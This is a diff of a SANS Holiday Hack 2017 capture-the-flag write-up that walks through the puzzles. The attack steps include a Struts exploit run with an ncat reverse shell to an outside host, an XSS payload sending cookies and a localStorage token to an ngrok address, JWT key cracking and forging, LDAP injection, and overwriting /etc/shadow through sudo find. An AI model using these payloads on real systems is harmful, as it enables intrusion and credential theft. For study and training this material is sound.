@@ -25,9 +25,9 @@ Play the snowball game to get the page.
 > 2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
 
 Look at the source code to find the link to the development site. Look at the bottom to see that it uses Apache Struts.
-It's also hinted that it can be exploited through the reference to Equifax. Searching "https://www.exploit-db.com/", we find a number of explits.
+It's also hinted that it can be exploited through the reference to Equifax. Searching "<https://www.exploit-db.com/>", we find a number of explits.
 Trying out a few, we find that ID 42627 works. Using it with the command `ncat -e /bin/bash mydomain.com 5000` gives us a reverse shell.
-Looking at the default webroot /var/www/html we find page 2 of the great book which can be accessed through "https://l2s.northpolechristmastown.com/GreatBookPage2.pdf".
+Looking at the default webroot /var/www/html we find page 2 of the great book which can be accessed through "<https://l2s.northpolechristmastown.com/GreatBookPage2.pdf>".
 Looking in the Apache Tomcat directory we can find Alabaster Snowball's password in "/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class"
 
 **Answer A:** The title of the page is "On the Topic of Flying Animals"  
@@ -105,7 +105,7 @@ Using the reverse shell setup with `nc -lvv 5000` we can set up another reverse 
 
 Looking at the code, specifically the XSS protection, we can easily see that we can bypass the protection with something like `<img/src/onerror="var x=new Image;x.src='https://dfd20926.ngrok.io/'+document.cookie+'/'+localStorage.getItem('np-auth').length">`
 This way we leak a JWT token which can be decoded with pyjwt into: `{"dept": "Engineering", "ou": "elf", "expires": "2017-08-16 12:00:47.248093+00:00", "uid": "alabaster.snowball"}`.
-Using JohnTheRipper with a jwt2john.py script from "https://github.com/Sjord/jwtcrack" we can brute force the key in a short amount time eventually finding it to be "3lv3s".
+Using JohnTheRipper with a jwt2john.py script from "<https://github.com/Sjord/jwtcrack>" we can brute force the key in a short amount time eventually finding it to be "3lv3s".
 Using this key we can forge a new token with: `pyjwt --key=3lv3s encode dept=Engineering ou=elf expires="2018-12-31 12:00:00.000000+00:00" uid=alabaster.snowball` to log in.
 Browsing around we find a menu option which can only be accessed by santa so we need to forge a valid token for him.
 The search is vulnerable to an LDAP injection. This can be done by providing the input `name=alab))(department=it)(|(cn=&isElf=True&attributes=profilePath%2Cgn%2Csn%2Cmail%2Cuid%2Cdepartment%2CtelephoneNumber%2Cdescription%2CuserPassword`.
@@ -125,7 +125,11 @@ By getting all the seven pages and playing the snowball game we eventually unloc
 ### Linux command hijacking
 
 Look at the .bashrc to see that there are a number of nasty aliases
-> cat .bashrc
+
+```bash
+cat .bashrc
+```
+
 ```
 ...  
 alias kill='true'  
@@ -136,10 +140,17 @@ alias skill='true'
 ```  
 
 Remove them
-> unalias -a
+
+```bash
+unalias -a
+```
 
 Find the process
-> ps aux
+
+```bash
+ps aux
+```
+
 ```
 ...  
 elf          8  0.0  0.0   4224   684 pts/0    S    01:13   0:00 /usr/bin/santaslittlehelperd  
@@ -147,33 +158,56 @@ elf          8  0.0  0.0   4224   684 pts/0    S    01:13   0:00 /usr/bin/santas
 ```  
 
 Kill it
-> kill 8
+
+```bash
+kill 8
+```
 
 ### Candy Cane Striper
 
 Make a copy of the binary
-> cp CandyCaneStriper CandyCaneStriper2
+
+```bash
+cp CandyCaneStriper CandyCaneStriper2
+```
 
 Use perl instead of chmod to change permissions
-> perl -e 'chmod 0755, "CandyCaneStriper2"'
+
+```bash
+perl -e 'chmod 0755, "CandyCaneStriper2"'
+```
 
 Run the program
-> ./CandyCaneStriper2
+
+```bash
+./CandyCaneStriper2
+```
 
 ### Train Startup
 
 Check what kind of file it is
-> file trainstartup 
+
+```bash
+file trainstartup
+```
+
 ```
 trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
 ```
 Use Qemu to start it
-> qemu-arm trainstartup
+
+```bash
+qemu-arm trainstartup
+```
 
 ### Web log
 
 Pick out the User-Agent field with awk, sort and count
-> awk '{print $12}' access.log | sort | uniq -c
+
+```bash
+awk '{print $12}' access.log | sort | uniq -c
+```
+
 ```
 ...
       1 "Dillo/3.0.5"
@@ -189,7 +223,11 @@ Pick out the User-Agent field with awk, sort and count
 ```
 
 Dillo is the least used browser, let's answer that.
-> ./runtoanswer 
+
+```bash
+./runtoanswer
+```
+
 ```
 Starting up, please wait......  
 Enter the name of the least popular browser in the web log: Dillo  
@@ -199,16 +237,24 @@ That is the least common browser in the web log! Congratulations!
 ### Christmas Songs
 
 Start SQLite with the database, list the tables and their schemas and finally join songs with likes, group them and pick the top.
-> sqlite3 christmassongs.db
-> .tables
-> .fullschema
-> SELECT songs.title, COUNT(\*) AS likes FROM likes LEFT JOIN songs ON songs.id = likes.songid GROUP BY likes.songid ORDER BY likes DESC LIMIT 0,10;
+
+```sql
+sqlite3 christmassongs.db
+.tables
+.fullschema
+SELECT songs.title, COUNT(*) AS likes FROM likes LEFT JOIN songs ON songs.id = likes.songid GROUP BY likes.songid ORDER BY likes DESC LIMIT 0,10;
+```
+
 ```
 Stairway to Heaven|11325
 ```
 
 Stairway to Heaven has the most likes, let's answer that.
-> ./runtoanswer 
+
+```bash
+./runtoanswer
+```
+
 ```
 Starting up, please wait......  
 Enter the name of the song with the most likes: Stairway to Heaven  
@@ -218,7 +264,11 @@ That is the #1 Christmas song, congratulations!
 ### Shadow file
 
 Let's see what we can run
-> sudo -l 
+
+```bash
+sudo -l
+```
+
 ```
 Matching Defaults entries for elf on e1be9fa300cb:  
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
@@ -227,18 +277,33 @@ User elf may run the following commands on e1be9fa300cb:
 ```
 
 We can run find as sudo using the group "shadow". Let's do that and use the "exec" flag of find to copy the file in place.
-> sudo -g shadow find /etc -name shadow.bak -exec cp {} /etc/shadow \;
+
+```bash
+sudo -g shadow find /etc -name shadow.bak -exec cp {} /etc/shadow \;
+```
 
 Then we can run the inspection.
-> inspect_da_box
+
+```bash
+inspect_da_box
+```
 
 ### isit42
 
 Let's create a function called rand which always returns 42.
-> echo "int rand(void){return 42;}" > derand.c  
+
+```bash
+echo "int rand(void){return 42;}" > derand.c
+```
 
 Compile it into a shared library
-> gcc -shared -o derand.so derand.c  
+
+```bash
+gcc -shared -o derand.so derand.c
+```
 
 Use LD_PRELOAD to load the library to override libc rand with our custom implementation and win.
-> LD_PRELOAD=./derand.so ./isit42  
+
+```bash
+LD_PRELOAD=./derand.so ./isit42
+```
